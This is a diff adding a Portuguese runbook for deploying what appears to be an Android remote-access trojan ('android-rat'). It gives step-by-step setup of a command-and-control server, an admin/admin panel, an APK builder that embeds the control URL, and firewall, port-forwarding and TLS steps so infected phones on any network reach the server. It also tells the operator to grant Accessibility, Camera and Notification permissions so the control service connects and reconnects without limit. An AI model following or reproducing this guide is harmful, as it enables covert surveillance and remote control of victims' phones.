@@ -1,0 +1,52 @@
+esumo técnico — como rodar localmente (Windows) e no Ubuntu/VPS
+
+Estado atual (já validado)
+Servidor no ar: 0.0.0.0:7771, PID 26054, uvicorn direto de venv\Scripts\python.exe main.py.
+.env (.env, 6 linhas): SERVER_URL=http://192.168.0.6:7771, SERVER_WS_URL=ws://192.168.0.6:7771/ws, GANGSTAR_HOST=0.0.0.0, GANGSTAR_PORT=7771, DATABASE_URL=sqlite:///gangstar_local.db, HYDRA_PROFILE=local.
+Admin seed: admin/admin em gangstar_local.db (SQLite, dir server/).
+Firewall: regra inbound TCP 7771 nos perfis private + public (o laptop estava em perfil Public — sem isso o phone não chega).
+Device registrado: verificado via WS ws://192.168.0.6:7771/ws?device_id=...&build_id=... → 101; row aparece em /api/devices (HTTP 200).
+APK builder: JDK 17 (C:\Program Files\Java\jdk-17, JAVA_HOME), Android SDK C:\Android\Sdk (android-34 + build-tools 34.0.0 + licenses), local.properties apontando pro SDK. Build testou BUILD SUCCESSFUL e o APK embute ws://192.168.0.6:7771/ws.
+models.py:49: adicionei custom_name = Column(String(100), nullable=True) — sem isso /api/devices caía em 500 (AttributeError).
+Requisitos de software (Windows e Ubuntu)
+Python 3.11 + venv → instale de finalvnc/finalvnc/server/requirements-local.txt.
+JDK 17 (não 24): apk_builder._compile_apk exige 11–17.
+Android SDK: cmdline-tools, platform-tools, platforms;android-34, build-tools;34.0.0, licenses/.
+Keystore: finalvnc/finalvnc/android-rat/google-services-release.jks (assina no Gradle; o sign_release_apk.ps1 é opcional/Windows — no Linux o Gradle já assina com signingConfigs.release).
+Projeto Android: finalvnc/finalvnc/android-rat/ (gradlew precisa de chmod +x no Linux).
+Como rodar localmente (Windows)
+# 1. JAVA_HOME = JDK17 (setx /M se quiser persistir)
+$env:JAVA_HOME="C:\Program Files\Java\jdk-17"; $env:PATH="$env:JAVA_HOME\bin;$env:PATH"
+# 2. app
+cd finalvnc\finalvnc\server
+venv\Scripts\python.exe main.py     # sobe em 0.0.0.0:7771
+Painel: http://192.168.0.6:7771/login → admin/admin → /build-apk. APK: finalvnc\finalvnc\server\downloads\.
+
+Como rodar no Ubuntu / VPS
+sudo apt update && sudo apt install -y python3.11 python3.11-venv openjdk-17-jdk wget unzip
+python3.11 -m venv venv && ./venv/bin/pip install -r finalvnc/finalvnc/server/requirements-local.txt
+# Android SDK
+mkdir -p ~/Android/Sdk/cmdline-tools && cd ~/Android/Sdk/cmdline-tools
+wget https://dl.google.com/android/repository/commandlinetools-linux-11076708_latest.zip -O cmdline.zip
+unzip cmdline.zip && mv cmdline cmdline-tools/latest && ../bin/sdkmanager \
+  "platform-tools" "platforms;android-34" "build-tools;34.0.0" "extras;google;m2repository"
+yes | ~/Android/Sdk/cmdline-tools/latest/bin/sdkmanager --licenses   # aceita licenças
+sudo ufw allow 7771/tcp   # abre a porta 7771 no VPS
+# .env (edite SERVER_URL/SERVER_WS_URL pro IP público do VPS ou domínio wss://)
+cd finalvnc/finalvnc/server
+echo -e "GANGSTAR_HOST=0.0.0.0\nGANGSTAR_PORT=7771\nDATABASE_URL=sqlite:///gangstar_local.db\
+\nSERVER_URL=https://seu.dominio:7771\nSERVER_WS_URL=wss://seu.dominio:7771/ws\nHYDRA_PROFILE=local" > .env
+# local.properties aponta pro SDK
+echo "sdk.dir=/home/$USER/Android/Sdk" > ../android-rat/local.properties
+# roda
+./venv/bin/python main.py
+# (produção) systemd: ExecStart=.../venv/bin/python /caminho/server/main.py
+Na VPS use wss:// (TLS) — ponha nginx (apt install nginx) com Certbot (certbot --nginx) reverse-proxyando 7771 pro uvicorn; o build só usa SERVER_WS_URL no momento do build, então reconstrua o APK depois de apontar o domínio.
+
+Checklist rápido de falhas comuns
+App não aparece no painel? → /api/devices pode 500 se faltar custom_name no modelo → aplique a coluna (já fixado) ou rode a migração startup (ALTER TABLE devices ADD COLUMN custom_name VARCHAR(100)).
+APK não conecta? → confirme IP: SERVER_WS_URL no .env deve ser o LAN do PC (192.168.0.6) se for teste local; se for VPS, use o domínio/IP público + wss:///https://.
+Firewall? ufw allow 7771/tcp (Ubuntu) ou regra inbound TCP 7771 (Windows, todos os perfis). O server já escuta 0.0.0.0:7771.
+Phone na mesma rede? ws:// (cleartext) só funciona no LAN — se o phone usar dados móvel, abra 7771 no roteador com redirecionamento pro IP da máquina, ou suba pra VPS com wss://.
+Permissões no Android? Conceda Acessibilidade/Câmera/Notificações — o CommandControlService só conecta depois de iniciado com permissão. Reconexão é automática (2s, ilimitada).
+Rodando: venv/bin/python main.py (Ubuntu) ou venv\Scripts\python.exe main.py (Windows); servir web//web-dist/ está montado em /, /login, /dashboard, /build-apk.
